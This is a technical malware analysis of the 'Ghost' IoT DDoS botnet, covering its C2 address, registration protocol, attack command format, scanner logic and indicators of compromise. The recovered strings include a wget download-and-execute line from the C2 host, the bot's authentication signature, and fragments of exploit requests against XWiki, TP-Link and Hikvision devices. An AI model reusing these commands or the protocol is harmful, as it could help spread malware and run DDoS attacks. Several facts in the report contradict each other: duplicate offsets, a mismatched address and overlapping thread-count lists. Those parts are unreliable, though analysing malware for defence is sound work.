# Ghost Botnet — Transport Layer Technical Specification

## Binary Metadata

| Attribute | Value |
|:---|:---|
| Architecture | MIPS LE 32-bit |
| Format | ELF dynamic executable |
| Image Base | `0x00010000` |
| Entry Point | `0x0001a8f0` (`main`) |
| .rodata Section | `0x00030340` – `0x00032aeb` |
| GOT Base | `0x00043150` |
| Function Count | 330 |

---

## 1. C2 Infrastructure Retrieval

### 1.1 C2 Address and Port Sources

The C2 server address and port are obtained through two mechanisms:

#### A. Command-Line Arguments (Primary)

The binary accepts `argv[1]` as the C2 hostname/IP and `argv[2]` as the C2 port:

```c
if (argc >= 2) {
    c2_host = argv[1];
} else {
    c2_host = "94.154.43.158";  // default, stored at .rodata+0x1514
}

if (argc >= 3) {
    c2_port = atoi(argv[2]);
} else {
    c2_port = 2323;  // default 0x913
}
```

#### B. Hardcoded Default Values

| Parameter | Default Value | Memory Location | Offset from .rodata base |
|:---|:---|:---|:---|
| C2 Host | `94.154.43.158` | `0x00031514` | `+0x1514` |
| C2 Port | `2323` (0x913) | Hardcoded in `main` | N/A |

**Verified Fact:** The default C2 IP `94.154.43.158` is stored as a null-terminated ASCII string at `.rodata + 0x1514` (absolute address `0x00031514`).

**Verified Fact:** The default port `2323` is loaded as an immediate constant `0x913` at instruction `0x0001a9bc` in `main`.

### 1.2 DNS Resolution Logic

The `connect_host` function (`0x00012258`) performs DNS resolution via the standard `getaddrinfo` API:

```
connect_host(hostname, port):
    // Build service name string
    snprintf(service_buf, 16, "%d", port)   // format at .rodata+0x340

    // Initialize addrinfo hints
    hints.ai_family = AF_UNSPEC  (0)
    hints.ai_socktype = SOCK_STREAM (2)

    // Resolve hostname
    ret = getaddrinfo(hostname, service_buf, &hints, &result)

    if ret == 0:
        for each entry in result chain:
            fd = socket(entry.ai_family, entry.ai_socktype, entry.ai_protocol)
            if fd >= 0:
                if connect(fd, entry.ai_addr, entry.ai_addrlen) == 0:
                    return fd    // success
                close(fd)
        freeaddrinfo(result)
    return -1    // failure
```

**Verified Fact:** The port is converted to a string using the format `"%d"` (at `.rodata+0x340`, absolute `0x00030680`) before being passed to `getaddrinfo`.

**Verified Fact:** The function iterates through all resolved addresses and attempts connection on each, closing failed sockets before trying the next.

### 1.3 C2 Address Summary

| Field | Value | Source |
|:---|:---|:---|
| Default C2 IP | `94.154.43.158` | Hardcoded at `0x00031514` |
| Default C2 Port | `2323` | Immediate constant in `main` |
| Override Mechanism | `argv[1]` (host), `argv[2]` (port) | Command-line |
| DNS Resolution | `getaddrinfo()` | Standard C library |
| Protocol Family | `AF_UNSPEC` (IPv4/IPv6) | `connect_host` hints |
| Socket Type | `SOCK_STREAM` (TCP) | `connect_host` hints |

---

## 2. Transport Initialization

### 2.1 Connection Establishment Sequence

The `main` function implements a continuous connection loop:

```
main():
    signal(SIGSEGV, SIG_DFL)       // instruction at 0x0001a918
    seed = time(NULL)
    srand(seed)

    LOOP:
        PRINTF("[CONNECT] Trying %s:%d...\n", c2_host, c2_port)

        fd = connect_host(c2_host, c2_port)

        if fd < 0:
            PUTS("[CONNECT] Failed, retrying in 10s")
            SLEEP(10)
            GOTO LOOP

        PUTS("[CONNECT] Connected!")

        // Send registration/authentication message
        send_all(fd, auth_string, 36)   // 36 bytes

        // Gather system information
        arch = exec("uname -m")
        os_id = exec("cat /etc/os-release | grep -E '^ID=' | cut -d= -f2 | tr -d '\"'")

        if os_id == "unknown" or os_id == "":
            os_id = exec("busybox --help 2>/dev/null | head -1")

        if os_id == "unknown" or os_id == "":
            os_id = exec("cat /proc/net/if_inet6 2>/dev/null | grep eth0")
            if "eth0" in result:
                os_id = "linux"  // fallback

        if os_id == "unknown" or os_id == "":
            os_id = "linux"
            arch = arch (unchanged)

        // Build identification string
        snprintf(id_buf, 128, "linux.%s.%s", arch, os_id)

        // Measure bandwidth (returns 0 in this build)
        bandwidth = measure_bandwidth()   // always returns 0

        // Build full registration payload
        snprintf(reg_buf, 256, "ARCH:%s %.2f\r\n\r\n%s", id_buf, bandwidth, hwaddr)
        send_all(fd, reg_buf, strlen(reg_buf))

        // Command processing loop
        WHILE (recv_line(fd, cmd_buf, 8192) > 0):
            token = strtok(cmd_buf, " \r\n")
            if token == "PING":
                send_all(fd, "PONG\r\n", 6)
            else if token in ATTACK_TYPES:
                target = strtok(NULL, " \r\n")
                port = atoi(strtok(NULL, " \r\n"))
                duration = atoi(strtok(NULL, " \r\n"))
                if duration > 3600:
                    duration = 3600
                start_attack(token, target, port, duration)

        close(fd)
        PUTS("[CONNECT] Disconnected, reconnecting in 5s")
        SLEEP(5)
        GOTO LOOP
```

### 2.2 Authentication / Registration Message

The initial registration message is sent immediately after TCP connection:

**Part 1 — Bot Signature (36 bytes):**
```
"ghostc2botsecretreuisdhfeuishfuish\r\n"
```
- Stored at `.rodata + 0x157c` (absolute `0x0003157c`)
- Sent via `send_all(fd, signature, 0x24)`

**Part 2 — System Information:**
```
"ARCH:<linux.<arch>.<os_id>> <bandwidth>\r\n\r\n<hwaddr>"
```

Where:
- `arch` = output of `uname -m` (e.g., `mips`, `armv7l`)
- `os_id` = extracted from `/etc/os-release` or fallback detection
- `bandwidth` = output of `measure_bandwidth()` (always `0` in this build)
- `hwaddr` = MAC address or fallback identifier

### 2.3 Network Parameters

| Parameter | Value | Source |
|:---|:---|:---|
| Protocol | TCP | `SOCK_STREAM` in `connect_host` |
| Socket Family | `AF_INET` / `AF_INET6` | `getaddrinfo` with `AF_UNSPEC` |
| Non-blocking | No | Standard blocking connect |
| Connection Timeout | None (blocking) | `connect()` blocks indefinitely |
| Retry Interval (initial) | `10` seconds | `sleep(10)` in main loop |
| Retry Interval (reconnect) | `5` seconds | `sleep(5)` after disconnect |
| Max Retry | Unlimited | Infinite loop |
| Send Buffer | Default | No explicit `setsockopt` on C2 socket |
| Receive Buffer | Default | No explicit `setsockopt` on C2 socket |

### 2.4 Reconnection Strategy

```
RETRY_LOOP (initial connection failure):
    sleep(10)
    retry connect_host()
    // no backoff multiplier — constant 10s interval

RECONNECT_LOOP (after established connection drops):
    close(fd)
    print "[CONNECT] Disconnected, reconnecting in 5s"
    sleep(5)
    retry connect_host()
    // no backoff multiplier — constant 5s interval
```

**Verified Fact:** Both retry intervals are constant with no exponential backoff. The initial connection retry is 10 seconds; the post-disconnect retry is 5 seconds.

---

## 3. String Table Analysis

### 3.1 Storage and Access Pattern

**Verified Fact:** The binary does NOT use string encryption or obfuscation. All strings are stored as plain null-terminated ASCII/UTF-8 in the `.rodata` section (`0x00030340` – `0x00032aeb`).

Strings are accessed via MIPS global offset table (GOT) indirection. The decompiler represents this as `PTR_LAB_00043150 + <offset>`, where the GOT entry at the computed address contains a base pointer to `.rodata`, and the offset is added to produce the final string address.

**Access Pattern:**
```
load base_pointer from GOT[-0x7fb0(gp)]
string_address = base_pointer + offset
```

The GOT base pointer resolves to `0x00030000`, making the effective string address:
```
string_address = 0x00030000 + offset
```

### 3.2 Recovered String Table Entries

#### C2 Connection Strings

| Offset | Absolute Address | String Value | Purpose |
|:---|:---|:---|:---|
| `+0x1514` | `0x00031514` | `94.154.43.158` | Default C2 hostname |
| `+0x1524` | `0x00031524` | `[CONNECT] Trying %s:%d...\n` | Connection attempt log |
| `+0x1540` | `0x00031540` | `[CONNECT] Failed, retrying in 10s` | Connection failure message |
| `+0x1564` | `0x00031564` | `[CONNECT] Connected!` | Connection success message |
| `+0x157c` | `0x0003157c` | `ghostc2botsecretreuisdhfeuishfuish\r\n` | Bot authentication signature |
| `+0x15a4` | `0x000315a4` | `r` | popen mode (read) |
| `+0x15a8` | `0x000315a8` | `uname -m` | Architecture detection command |
| `+0x15b4` | `0x000315b4` | `cat /etc/os-release 2>/dev/null \| grep -E '^ID=' \| cut -d= -f2 \| tr -d '"'` | OS ID detection |
| `+0x1600` | `0x00031600` | `unknown` | Fallback OS identifier |
| `+0x1603` | `0x00031603` | `busybox --help 2>/dev/null \| head -1` | BusyBox detection |
| `+0x1608` | `0x00031608` | (hwaddr detection command) | Hardware address detection |
| `+0x1630` | `0x00031630` | `eth0` | Network interface name |
| `+0x1640` | `0x00031640` | `linux.%s.%s` | System ID format string |
| `+0x164c` | `0x0003164c` | `ARCH:%s %.2f\r\n\r\n%s` | Registration payload format |
| `+0x165c` | `0x0003165c` | ` \r\n` | Command token delimiter |
| `+0x1660` | `0x00031660` | `PING` | Heartbeat command |
| `+0x1668` | `0x00031668` | `PONG\r\n` | Heartbeat response |
| `+0x1670` | `0x00031670` | `[CONNECT] Disconnected, reconnecting in 5s` | Reconnect message |
| `+0x14d4` | `0x000314d4` | `[ATTACK] %s %s:%d for %ds\n` | Attack initiation log |
| `+0x14f0` | `0x000314f0` | `[ERROR] malloc attack_args failed` | Allocation failure message |

#### Attack Type Strings

| Offset | Absolute Address | String Value | Attack Type |
|:---|:---|:---|:---|
| `+0xef4` | `0x00030ef4` | `FIVEM` | FiveM game server attack |
| `+0xef8` | `0x00030ef8` | `VSE` | Valve Source Engine attack |
| `+0xf00` | `0x00030f00` | `MCPE` | Minecraft Pocket Edition attack |
| `+0xf04` | `0x00030f04` | `HEX` | Hex payload flood |
| `+0xf08` | `0x00030f08` | `UDP` | Standard UDP flood |
| `+0xf10` | `0x00030f10` | `UDP-BIG` | Large UDP packet flood |
| `+0xf1c` | `0x00030f1c` | `UDP-PLAIN` | Plain UDP flood |
| `+0xfa4` | `0x00030fa4` | `UDP-BYPASS` | UDP bypass flood |
| `+0xf5c` | `0x00030f5c` | `BANDWIDTH-UDP` | UDP bandwidth flood |
| `+0xf6c` | `0x00030f6c` | `PPS-UDP` | UDP packets-per-second flood |
| `+0xf74` | `0x00030f74` | `TCP` | TCP connection flood |
| `+0xf78` | `0x00030f78` | `BANDWIDTH-TCP` | TCP bandwidth flood |
| `+0xf88` | `0x00030f88` | `PPS-TCP` | TCP PPS flood |
| `+0xf90` | `0x00030f90` | `TCPBYPASS` | TCP bypass flood |
| `+0xf9c` | `0x00030f9c` | `OVHDROP` | OVH drop bypass attack |
| `+0xfa4` | `0x00030fa4` | `UDPHEX` | UDP hex payload flood |
| `+0xfb4` | `0x00030fb4` | `OVH` | OVH bypass attack |
| `+0xfb8` | `0x00030fb8` | `MIX` | Mixed attack |
| `+0xfc0` | `0x00030fc0` | `SYN` | TCP SYN flood |
| `+0x1008` | `0x00031008` | `HTTPGET` | HTTP GET flood |
| `+0x1014` | `0x00031014` | `HTTPPOST` | HTTP POST flood |
| `+0x10a0` | `0x000310a0` | `BROWSER` | Browser simulation attack |
| `+0x11cc` | `0x000311cc` | `BROWSER-2` | Browser login simulation |
| `+0x12f0` | `0x000312f0` | `BROWSER-3` | Browser search simulation |
| `+0x1420` | `0x00031420` | `MCJAVA` | Minecraft Java Edition attack |
| `+0x1428` | `0x00031428` | `ADMIN-UDP` | Admin UDP flood (multi-socket) |

#### DNS Server Strings (used in DNS amplification)

| Offset | Absolute Address | String Value |
|:---|:---|:---|
| `+0xf34` | `0x00030f34` | `8.8.8.8` |
| `+0xf3c` | `0x00030f3c` | `1.1.1.1` |
| `+0xf44` | `0x00030f44` | `9.9.9.9` |
| `+0xf4c` | `0x00030f4c` | `208.67.222.222` |
| `+0xf58` | `0x00030f58` | `64.6.64.6` |

#### HTTP Attack Payload Strings

| Offset | Absolute Address | String Value | Purpose |
|:---|:---|:---|:---|
| `+0xfc0` | `0x00030fc0` | `GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n` | HTTP GET template |
| `+0x1014` | `0x00031014` | `POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n%s` | HTTP POST template |
| `+0x10a8` | `0x000310a8` | `GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,...\r\nConnection: close\r\n...` | Browser simulation GET |
| `+0x11d8` | `0x000311d8` | `GET /login HTTP/1.1\r\nHost: %s\r\n...` | Login page simulation |
| `+0x12fc` | `0x000312fc` | `POST /search?q=test HTTP/1.1\r\n...` | Search simulation |

#### Scanner / Exploit Strings

| Offset | Absolute Address | String Value | Purpose |
|:---|:---|:---|:---|
| `+0x340` | `0x00030680` | `%d` | Port number format |
| `+0x354` | `0x00030354` | `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.154.43.158/ghost.sh; ...` | Self-replication payload |
| `+0x83c` | `0x0003083c` | `wget -q -O /tmp/ghost.sh http://94.154.43.158/ghost.sh; chmod 777 /tmp/ghost.sh; sh /tmp/ghost.sh &` | Download-and-execute |
| `+0x558` | `0x00030558` | `GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=%s HTTP/1.1\r\n...` | XWiki exploit payload |
| `+0x5f4` | `0x000305f4` | `POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1\r\n...` | TP-Link exploit payload |
| `+0x6d4` | `0x000306d4` | `POST /admin/service/run HTTP/1.1\r\n...` | Generic service exploit |
| `+0x7ac` | `0x000307ac` | `PUT /SDK/webLanguage HTTP/1.1\r\n...` | Hikvision exploit |
| `+0x8f4` | `0x000308f4` | `GET %s HTTP/1.1\r\n...` | Generic HTTP exploit |

#### Protocol Constants

| Offset | Absolute Address | String Value | Purpose |
|:---|:---|:---|:---|
| `+0x167c` | `0x0003167c` | `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/` | Base64 alphabet |

---

## 4. C2 Protocol Specification

### 4.1 Message Format

The C2 protocol is a **line-based plaintext text protocol** over TCP. Lines are delimited by `\n` (newline). The `recv_line` function reads one byte at a time until `\n` is encountered.

### 4.2 Registration Sequence

```
Client -> Server: "ghostc2botsecretreuisdhfeuishfuish\r\n"
Client -> Server: "ARCH:linux.<arch>.<os_id> <bandwidth>\r\n\r\n<hwaddr>"
```

**Verified Fact:** The bot signature is exactly 36 bytes (`0x24`) including the trailing `\r\n`.

### 4.3 Command Format

Commands are received as newline-terminated strings and tokenized using `" \r\n"` as delimiters:

```
<attack_type> <target_ip> <port> <duration_seconds>
```

- `attack_type`: One of the 26 registered attack type strings
- `target_ip`: IPv4 address string
- `port`: Target port number (decimal)
- `duration_seconds`: Attack duration, capped at `3600` seconds (0xe10)

### 4.4 Heartbeat

```
Server -> Client: "PING"
Client -> Server: "PONG\r\n"
```

### 4.5 Attack Thread Model

When an attack command is received, `start_attack` spawns multiple parallel threads:

```
start_attack(type, target, port, duration):
    thread_count = get_thread_count(type)   // 2, 4, 6, or 12

    for i in range(thread_count):
        args = malloc(0x120)
        args[0..14]     = attack_type (15 bytes, null-terminated)
        args[0x10..0x10f] = target_ip (255 bytes, null-terminated)
        args[0x110]     = port (4 bytes)
        args[0x114]     = duration (4 bytes)
        args[0x118]     = thread_index (4 bytes)
        args[0x11c]     = time(NULL) ^ (thread_index * 0x9E3770B1)  // RNG seed

        pthread_create(attack_loop, args)
        pthread_detach(thread)
```

Thread counts by attack type:
- Default: 2 threads
- FIVEM, VSE, MCPE, HEX, UDP, UDP-BIG, UDP-PLAIN, UDP-BYPASS, BANDWIDTH-UDP, PPS-UDP, TCP, BANDWIDTH-TCP, PPS-TCP, TCPBYPASS, OVHDROP, UDPHEX, OVH, MIX, SYN, HTTPGET, HTTPPOST, BROWSER, BROWSER-2, BROWSER-3, MCJAVA: 4 threads
- TCPBYPASS, BANDWIDTH-TCP, PPS-TCP, BANDWIDTH-UDP, PPS-UDP, MIX: 6 threads
- ADMIN-UDP: 12 threads

---

## 5. Scanner Subsystem

### 5.1 Random IP Generation

The `random_public_ipv4` function (`0x000138a4`) generates random IPv4 addresses while excluding:

- Private ranges: `10.0.0.0/8`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, `192.168.0.0/16`
- Reserved ranges: `224.0.0.0/3` (multicast), `100.64.0.0/10` (CGNAT)
- Specific exclusions: `198.18.0.0/15`, `198.19.0.0/16`, `198.51.100.0/24`, `203.0.113.0/24`

```
random_public_ipv4(seed):
    LOOP:
        first_octet = (rand() >> 8) & 0xFF
        second_octet = rand() & 0xFF

        if first_octet == 0: continue
        if first_octet == 10: continue
        if first_octet == 127: continue
        if first_octet == 169: continue
        if first_octet == 172 and second_octet in [16..31]: continue
        if first_octet == 192 and second_octet == 168: continue
        if first_octet >= 224: continue
        if first_octet == 100 and 64 <= second_octet < 128: continue
        if first_octet == 198 and second_octet in [18, 19, 51]: continue
        if first_octet == 203 and second_octet == 0: continue

        return (rand() << 16) | (rand() & 0xFFFF)
```

### 5.2 Scanner Loop

```
scanner_loop():
    seed = time(NULL) ^ pthread_self()

    LOOP:
        WHILE active_attacks > 0:
            sleep(1)

        target_ip = random_public_ipv4(&seed)
        if is_tcp_port_open(target_ip, 8080, timeout=1000ms):
            printf("[SCANNER] Found open port on %s\n", target_ip)
            exploit_target(target_ip)
        else:
            usleep(50000)  // 50ms backoff
```

### 5.3 Exploit Targets

The `exploit_target` function (`0x0001379c`) sequentially attempts five exploit modules:

1. `exploit_try_xwiki` — XWiki SolrSearch RCE
2. `exploit_try_tplink` — TP-Link router RCE
3. `exploit_try_service` — Generic service RCE
4. `exploit_try_hik` — Hikvision device RCE
5. `exploit_try_dlink` — D-Link router RCE

All exploits target port `8080` (0x1f90) and use HTTP-based payloads.

---

## 6. Analysis Gaps

| Gap | Reason | Impact |
|:---|:---|:---|
| `measure_bandwidth()` returns 0 | Function body is stubbed/empty | Bandwidth value in registration is always `0.00` |
| HW address detection command | String at `+0x1608` not fully readable in rodata dump | Exact command for MAC address retrieval not confirmed |
| DNS amplification payload structure | DNS query construction uses `res_mkquery` | Exact DNS record type and query format not fully decompiled |
| Scanner exploit payloads | Individual exploit functions not fully decompiled in this analysis | Specific vulnerability exploitation techniques not documented |
| C2 command extensions | Only attack and PING commands observed | Potential additional C2 commands not identified |
| Attack payload content | HTTP attack templates use `%s` for UA | Actual User-Agent strings generated at runtime by `rand_ua()` |

---

## 7. Indicators of Compromise (IOCs)

### 7.1 Network IOCs

| Type | Value | Context |
|:---|:---|:---|
| C2 IP | `94.154.43.158` | Default command server |
| C2 Port | `2323` | Default TCP port |
| Download URL | `http://94.154.43.158/ghost.sh` | Self-replication |
| DNS Servers | `8.8.8.8`, `1.1.1.1`, `9.9.9.9`, `208.67.222.222`, `64.6.64.6` | DNS amplification sources |

### 7.2 File System IOCs

| Path | Purpose |
|:---|:---|
| `/tmp/ghost.sh` | Self-replication download target |
| `/var/run/ghost.sh` | Alternative download location |
| `/etc/os-release` | OS detection read access |
| `/proc/net/if_inet6` | Network interface detection |

### 7.3 Behavioral IOCs

- Bot signature string: `ghostc2botsecretreuisdhfeuishfuish`
- Registration format: `ARCH:linux.<arch>.<os_id>`
- PING/PONG heartbeat protocol
- Scanner targeting port `8080`
- Exploits for XWiki, TP-Link, Hikvision, D-Link
- Attack types: UDP, TCP, HTTP, DNS, Minecraft (Java/PE/FiveM)
